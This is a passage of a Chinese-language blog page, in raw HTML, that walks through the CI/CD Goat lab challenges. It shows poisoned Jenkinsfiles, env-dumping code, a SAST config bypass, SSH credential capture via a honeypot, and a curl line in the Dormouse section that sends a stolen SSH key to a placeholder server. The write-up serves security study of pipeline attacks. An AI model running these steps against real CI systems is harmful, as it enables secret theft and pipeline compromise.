2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="为什么">为什么？<a href="#为什么" class="hash-link" aria-label="Direct link to 为什么？" title="Direct link to 为什么？">​</a></h3>
<p>登录 admin 可以看到这个题有两个管段 wonderland-caterpillar-test 通过 fork 合并触发，wonderland-caterpillar-prod 指 没有 PR 的分支</p>
<p><img loading="lazy" alt="image-20240327163926504" src="/assets/images/image-20240327163926504-06f76e7827da90f1db10b44ca9ca40c0.png" width="1510" height="530" class="img_ev3q"></p>
<p><img loading="lazy" alt="image-20240327173956456" src="/assets/images/image-20240327173956456-da90afcebc29a4aea728d4114f2fff5c.png" width="2148" height="1060" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x05-cheshire-cat---cicd-sec-4cicd-sec-5">0x05 Cheshire Cat   CICD-SEC-4、CICD-SEC-5<a href="#0x05-cheshire-cat---cicd-sec-4cicd-sec-5" class="hash-link" aria-label="Direct link to 0x05 Cheshire Cat   CICD-SEC-4、CICD-SEC-5" title="Direct link to 0x05 Cheshire Cat   CICD-SEC-4、CICD-SEC-5">​</a></h2>
<p>用前面介绍过的指定节点执行命令</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent {label &#x27;built-in&#x27;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stage (&#x27;poc&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                sh &#x27;touch /tmp/pwn.txt&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x06-twiddledum--cicd-sec-3">0x06 Twiddledum  CICD-SEC-3<a href="#0x06-twiddledum--cicd-sec-3" class="hash-link" aria-label="Direct link to 0x06 Twiddledum  CICD-SEC-3" title="Direct link to 0x06 Twiddledum  CICD-SEC-3">​</a></h2>
<p>twiddledum 是根据 twiddledee 的 tag 变动来执行的，修改 twiddledee 的 index.js 为</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">const child_process = require(&#x27;child_process&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">child_process.exec(&#x27;env|base64 -w 0&#x27;,function(error, stdout, stderr){console.log(stdout)});</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>提交后手动 build</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git tag 1.2.0 HEAD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push origin 1.2.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x07-dodo--cicd-sec-1">0x07 Dodo  CICD-SEC-1<a href="#0x07-dodo--cicd-sec-1" class="hash-link" aria-label="Direct link to 0x07 Dodo  CICD-SEC-1" title="Direct link to 0x07 Dodo  CICD-SEC-1">​</a></h2>
<p>引入 <a href="https://github.com/bridgecrewio/checkov" target="_blank" rel="noopener noreferrer">checkov</a> 产生的安全问题，这个工具会读取仓库中的 .checkov.yml 配置文件作为 checkov 运行的配置，具体原理参考 <a href="https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/" target="_blank" rel="noopener noreferrer">这篇文章</a> 。</p>
<p>复现修改 main.tf 的 ACL 为 public-read</p>
<p><img loading="lazy" alt="image-20240328114422749" src="/assets/images/image-20240328114422749-6dc686583ccbf6b1d0e3383f6bddcbcc.png" width="754" height="200" class="img_ev3q"></p>
<p>创建 .checkov.yml 文件</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">soft-fail: true</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">check:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - THIS_NOT_THE_CHECK_YOUR_ARE_LOOKING_FOR</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>push</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git add .checkov.yml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git commit -m &quot;add&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>需要注意的是 如果是本地拉取后再 commit 的会在 jenkins 服务器上创建账号，这个账号和 git 提交时的号有关，创建后就需要 admin 账号才能删除，是个天坑</p>
<p><img loading="lazy" alt="image-20240328141601962" src="/assets/images/image-20240328141601962-5e9373658e6379072895f1228be51fd2.png" width="1752" height="110" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x08-hearts">0x08 Hearts<a href="#0x08-hearts" class="hash-link" aria-label="Direct link to 0x08 Hearts" title="Direct link to 0x08 Hearts">​</a></h2>
<p>新建 Node 通过 SSH 连接获取 prod ssh 密钥</p>
<p>使用 <a href="https://github.com/cowrie/cowrie" target="_blank" rel="noopener noreferrer">cowrie</a> 蜜罐</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run -p 2222:2222 cowrie/cowrie</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>新建后选择需要获取的凭证节点及蜜罐监听 ip</p>
<p><img loading="lazy" alt="image-20240328145637049" src="/assets/images/image-20240328145637049-1ac796483508d8a9da834a19d4d95b10.png" width="2116" height="934" class="img_ev3q"></p>
<p>监听得到 Prod 的 ssh 密码</p>
<p><img loading="lazy" alt="image-20240328141146680" src="/assets/images/image-20240328141146680-0ae4062a2a1b9e3cd61977987aa03d81.png" width="855" height="102" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x09-dormouse">0x09 Dormouse<a href="#0x09-dormouse" class="hash-link" aria-label="Direct link to 0x09 Dormouse" title="Direct link to 0x09 Dormouse">​</a></h2>
<p>Wonderland/dormouse 仓库的 Jenkinsfile 文件存在一个下载 .sh 文件的地址</p>
<p><img loading="lazy" alt="image-20240328161730165" src="/assets/images/image-20240328161730165-0f2a490602d04bb890468ef8545e15e8.png" width="1978" height="450" class="img_ev3q"></p>
<p>进入 <a href="http://localhost:3000/Cov/reportcov" target="_blank" rel="noopener noreferrer">http://localhost:3000/Cov/reportcov</a> 仓库，Jenkinsfile 文件直接拼接 title 执行命令，存在代码注入</p>
<p><img loading="lazy" alt="image-20240328161956710" src="/assets/images/image-20240328161956710-70cf32b3f2859c314b483f902ae4229f.png" width="2020" height="826" class="img_ev3q"></p>
<p>通过环境变量 KEY 向远程  主机复制文件，ssh 密钥，所以可以获取该变量</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">`echo &quot;${KEY}&quot; &gt; key &amp;&amp; curl -v -F file=@key &lt;YOUR SERVER&gt;`</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240328162059538" src="/assets/images/image-20240328162059538-2373143951ad7c723686341c44f535b7.png" width="1484" height="222" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x10-mock-turtle">0x10 Mock Turtle<a href="#0x10-mock-turtle" class="hash-link" aria-label="Direct link to 0x10 Mock Turtle" title="Direct link to 0x10 Mock Turtle">​</a></h2>
<p>解读 Jenkinsfile 文件的三个 check ，按要求构造后创建新分支后发起 PR</p>
<p><img loading="lazy" alt="image-20240328173112276" src="/assets/images/image-20240328173112276-28ecc2840afbf739ef450d523ebac5bd.png" width="2232" height="1456" class="img_ev3q"></p>
<p>具体 check 解读见 chatgpt</p>
<p><img loading="lazy" alt="image-20240328173425683" src="/assets/images/image-20240328173425683-47039d427681b21ba1cab069d330befe.png" width="800" height="1020" class="img_ev3q"></p>
<p><strong>参考</strong></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/13009" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/13009</a></p>
<p><a href="https://tttang.com/archive/1650/" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1650/</a></p>
</blockquote></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/docs/tags/cve">CVE</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/docs/tags/cicd">CICD</a></li></ul></div></div><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/Whoopsunix/whoopsunix.github.io/docs/05-DevOpsAttack/01-cicd-goat/01-cicd-goat.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/DevOpsAttack/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">DevOps Attack</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/DevOpsAttack/Jenkins/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Jenkins Attack</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe" class="table-of-contents__link toc-highlight">0x01 CICD-SEC-4 Poisoned Pipeline Execution (PPE)  White Rabbit(D-PPE)</a></li><li><a href="#原理" class="table-of-contents__link toc-highlight">原理</a></li><li><a href="#漏洞复现" class="table-of-contents__link toc-highlight">漏洞复现</a><ul><li><a href="#恶意-jenkinsfile-文件" class="table-of-contents__link toc-highlight">恶意 Jenkinsfile 文件</a></li><li><a href="#合并分支" class="table-of-contents__link toc-highlight">合并分支</a></li></ul></li><li><a href="#0x02-mad-hatteri-ppe" class="table-of-contents__link toc-highlight">0x02 Mad Hatter(I-PPE)</a></li><li><a href="#0x03-cicd-sec-6-insufficient-credential-hygiene-duchess" class="table-of-contents__link toc-highlight">0x03 CICD-SEC-6 Insufficient Credential Hygiene Duchess</a></li><li><a href="#0x04-caterpillar" class="table-of-contents__link toc-highlight">0x04 Caterpillar</a><ul><li><a href="#为什么" class="table-of-contents__link toc-highlight">为什么？</a></li></ul></li><li><a href="#0x05-cheshire-cat---cicd-sec-4cicd-sec-5" class="table-of-contents__link toc-highlight">0x05 Cheshire Cat   CICD-SEC-4、CICD-SEC-5</a></li><li><a href="#0x06-twiddledum--cicd-sec-3" class="table-of-contents__link toc-highlight">0x06 Twiddledum  CICD-SEC-3</a></li><li><a href="#0x07-dodo--cicd-sec-1" class="table-of-contents__link toc-highlight">0x07 Dodo  CICD-SEC-1</a></li><li><a href="#0x08-hearts" class="table-of-contents__link toc-highlight">0x08 Hearts</a></li><li><a href="#0x09-dormouse" class="table-of-contents__link toc-highlight">0x09 Dormouse</a></li><li><a href="#0x10-mock-turtle" class="table-of-contents__link toc-highlight">0x10 Mock Turtle</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Whoopsunix © 2024</div></div></div></footer></div>
<script src="/assets/js/runtime~main.ec66b09e.js"></script>
<script src="/assets/js/main.da4bcc20.js"></script>
</body>
</html>